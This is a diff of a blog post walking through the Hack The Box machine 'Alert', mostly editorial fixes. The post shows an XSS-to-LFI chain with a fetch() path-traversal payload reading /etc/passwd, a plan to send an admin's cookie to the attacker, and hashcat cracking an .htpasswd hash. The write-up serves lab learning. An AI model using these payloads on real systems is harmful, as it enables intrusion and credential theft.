@@ -7,7 +7,7 @@ tags: ["Easy", "Linux", "Hack The Box", "Hacking", "Web", "Walkthrough"]
 ---
 
 ## Reconnaissance & Enumeration
-- Started with an Nmap scan, revealing open ports: 22, 80.
+- Started with a Nmap scan, revealing open ports: 22, 80.
 ![Pasted image 20241218005036.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241218005036.png?raw=true)
 - From the scan results I can also see `12227` port open which is also interesting.
 - The scan results showed that Apache2 was hosting the website.
@@ -18,13 +18,13 @@ tags: ["Easy", "Linux", "Hack The Box", "Hacking", "Web", "Walkthrough"]
 - I uploaded a `.md` file with JavaScript snippet init for testing, below were the contents of my md file  
 ![Pasted image 20241218005523.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241218005523.png?raw=true)
 - As expected the contents were rendered and loaded like this
-![Pasted image 20241218005550.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241218005523.png?raw=true)
+![Pasted image 20241218005550.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241218005550.png?raw=true)
 - This is quite bad. It can execute arbitrary code as it renders the contents
 
 ## Exploitation
 - Also another functionality in this website is pretty straight forward, where in `contact form` whatever link is filled and sent seems to be clicked by an admin. 
 - We can easily get the admin's cookie by making a `.md` file with malicious payload and by sharing the `.md` file link using the share option to the admin through the contact form. The admin will eventually click the link and it will make the code to execute on his browser potentially sending the cookie to us(Attacker). 
-- More dangerously we could also read arbitrary files using the `message.php` parameter 
+- More dangerously we could also read arbitrary files using the `message.php` 
 - So to exploit this LFI vulnerability I tried this payload and opened a nc on other side. 
 
 
@@ -53,19 +53,24 @@ fetch("http://alert.htb/messages.php?file=../../../../../../etc/passwd").then(re
 </script>
 ```
 ![Pasted image 20241218010840.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241218010840.png?raw=true)
-- Found couple of users. Now the configs for apache2 running websites generally resides at `/etc/apache2/sites-available/000-default.conf` I learnt this from enumerating my own machine.
+- Found couple of users. The configs for apache2 websites generally resides at `/etc/apache2/sites-available/000-default.conf` I learnt this from enumerating my own machine.
 ![lies-within-you](https://media1.tenor.com/m/fG6zxAnLtWsAAAAC/vegito-db.gif)
 ![Pasted image 20241218011112.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241218011112.png?raw=true)
 - After I modified the original payload to read this configuration file and  I got the output.
 ![Pasted image 20241218011242.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241218011242.png?raw=true)
 - Got the `.htpasswd` location. Usually this file contains the passwords or hashes for apache2.
-- Within that file password hash for user `albert` was there  
+- Within that file, password hash for user `albert` was there  
 ![Pasted image 20241218011625.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241218011625.png?raw=true)
-- Let's crack the hash I used hashcat to crack this hash `hashcat hash.txt  /usr/share/wordlists/rockyou.txt -m 1600 --username` Here I specified module `1600` to crack apache type hash and with as `albert` username is presented with the hash we have to specify `--username` flag
+- Let's crack the hash I used hashcat to crack this hash 
+```bash
+hashcat hash.txt  /usr/share/wordlists/rockyou.txt -m 1600 --username
+```
+- Here I specified module `1600` to crack apache type hash and with as `albert` username is presented with the hash we have to specify `--username` flag
 ![Pasted image 20241218012743.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241218012743.png?raw=true)
 - Now I can use ssh to login as user `albert`
-- We got the {{< keyword >}} User flag {{< /keyword >}}
+- I got the {{< keyword >}} User flag {{< /keyword >}}
 
+{{< alert icon="circle-info" >}} Sorry I accidently nuked the user flag image {{< /alert >}} 
 ## Privilege Escalation
 - General SUID, SGID, Capabilities didn't had anything promising
 - But anyway there was a internal web service running on port 80 `ss -tunlp` so I tunneled it to my machine via ssh on port 2000.
@@ -73,7 +78,7 @@ fetch("http://alert.htb/messages.php?file=../../../../../../etc/passwd").then(re
 ssh -L 2000:localhost:8080 albert@alert.Hack The Box
 ```
 ![Pasted image 20241218014520.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241218014520.png?raw=true)
-- The web service name litterely  `websitemonitor` which track and monitor the websites like `alert.htb`
+- The web service name is litterely  `websitemonitor` which tracks and monitor the websites like `alert.htb`
 - I found the website's directory location at `/opt/websitemonitor`
 - The configuration files for this website are stored within `/config`
 ![Pasted image 20241218020002.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241218020002.png?raw=true)
